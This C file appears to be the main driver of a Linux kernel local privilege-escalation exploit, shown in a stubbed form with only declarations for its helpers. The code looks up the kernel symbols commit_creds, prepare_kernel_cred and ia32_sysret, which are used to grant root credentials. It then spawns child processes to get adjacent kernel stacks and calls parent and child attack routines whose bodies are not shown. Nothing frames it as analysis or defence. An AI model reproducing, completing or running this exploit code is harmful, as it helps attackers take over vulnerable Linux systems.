
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef scalar_t__ _prepare_kernel_cred ;
typedef scalar_t__ _commit_creds ;


 int KSTACK_LOWER ;
 int KSTACK_PARENT ;
 int KSTACK_UPPER ;
 scalar_t__ commit_creds ;
 int do_child_lower () ;
 int do_child_upper () ;
 int do_parent () ;
 int exit (int) ;
 int get_adjacent_kstacks () ;
 scalar_t__ get_symbol (char*) ;
 scalar_t__ ia32_sysret ;
 scalar_t__ prepare_kernel_cred ;
 int printf (char*) ;

int
main(int argc, char **argv)
{
 int type;

 if (sizeof(unsigned long) != 8) {
  printf("[-] x86_64 only, sorry!\n");
  exit(1);
 }

 printf("[+] looking for symbols...\n");

 commit_creds = (_commit_creds) get_symbol("commit_creds");
 if (!commit_creds) {
  printf("[-] symbol table not available, aborting!\n");
  exit(1);
 }

 prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
 if (!prepare_kernel_cred) {
  printf("[-] symbol table not available, aborting!\n");
  exit(1);
 }

 ia32_sysret = get_symbol("ia32_sysret");
 if (!ia32_sysret) {
  printf("[-] symbol table not available, aborting!\n");
  exit(1);
 }

 printf("[+] spawning children to achieve adjacent kstacks...\n");

 type = get_adjacent_kstacks();

 if (type == KSTACK_PARENT) {
  do_parent();
 } else if (type == KSTACK_UPPER) {
  do_child_upper();
 } else if (type == KSTACK_LOWER) {
  do_child_lower();
 }

 return 0;
}
